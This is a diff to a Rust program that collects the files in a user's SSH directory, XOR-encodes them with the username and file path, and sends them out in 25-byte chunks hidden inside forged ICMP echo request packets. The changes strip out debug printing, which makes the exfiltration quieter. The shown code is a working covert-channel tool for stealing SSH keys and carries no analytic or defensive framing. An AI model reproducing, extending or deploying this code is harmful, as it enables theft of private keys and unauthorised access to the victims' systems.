@@ -53,12 +53,12 @@ fn attempt_false_icmp(msg: &[u8]) -> Result<(), ()> {
         })
         .collect();
 
-    println!(
-        "Orig: {:?}\nXOR Key: {}\nEncoded: {:?}",
-        msg,
-        xor_key,
-        data.as_slice()
-    );
+    // println!(
+    //     "Orig: {:?}\nXOR Key: {}\nEncoded: {:?}",
+    //     msg,
+    //     xor_key,
+    //     data.as_slice()
+    // );
 
     let mut icmp_packet = MutableEchoRequestPacket::new(&mut icmp_buffer).unwrap();
     icmp_packet.set_icmp_type(IcmpTypes::EchoRequest);
@@ -73,7 +73,7 @@ fn attempt_false_icmp(msg: &[u8]) -> Result<(), ()> {
 
     tx.send_to(ipv4_packet, net::IpAddr::V4(ip_addr)).unwrap();
 
-    println!("sent!");
+    // println!("sent!");
     Err(())
 }
 
@@ -98,9 +98,7 @@ fn get_ssh_filepaths() -> Vec<PathBuf> {
             .filter_map(|dir_entry| match dir_entry {
                 Ok(entry) => {
                     if let Ok(file_type) = entry.file_type() {
-                        println!("{}", entry.path().to_str().unwrap());
                         if file_type.is_file() {
-                            println!("{}", entry.path().to_str().unwrap());
                             Some(entry.path())
                         } else {
                             None
@@ -146,11 +144,7 @@ fn main() {
 
     let paths = get_ssh_filepaths();
 
-    println!("");
-
     for p in paths {
-        println!("{}", p.to_str().unwrap());
-
         if let Ok(file) = get_file_data(&p) {
             let mut to_send: Vec<u8> = username.bytes().collect();
             let mut path: Vec<u8> = p.as_path().to_str().unwrap().bytes().collect();
@@ -164,16 +158,6 @@ fn main() {
             for window in to_send.chunks(25) {
                 let _ = attempt_false_icmp(window);
             }
-
-            println!("here");
         }
-
-        println!("done");
     }
-
-    // let msg = String::from("hello noah test test test");
-    // match attempt_false_icmp(&msg) {
-    //     Ok(_) => print!("Sent Fake ICMP packet with msg {}", msg),
-    //     _ => (),
-    // }
 }
